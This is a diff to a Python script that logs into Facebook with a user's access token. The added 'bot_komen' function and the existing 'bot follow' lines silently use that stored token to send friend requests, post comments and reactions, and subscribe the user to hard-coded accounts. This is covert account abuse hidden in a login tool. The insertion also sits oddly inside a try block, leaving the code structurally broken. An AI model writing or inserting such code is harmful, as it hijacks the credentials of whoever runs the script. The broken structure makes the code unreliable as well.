@@ -140,6 +140,25 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
+######BOT KOMEN#######
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;39m[!] Token invalid"
+		os.system('rm -rf login.txt')
+	una = ('100017584682867')
+	kom = ('Good day😊')
+	reac = ('LOVE')
+	post = ('953529338576547')
+	post2 = ('800676813861801')
+	kom2 = ('Please send me this script🙏')
+	reac2 = ('ANGRY')
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
 			#-> bot follow
 			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      # Raka Andrian Tara
 			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      # RAKA THE KING
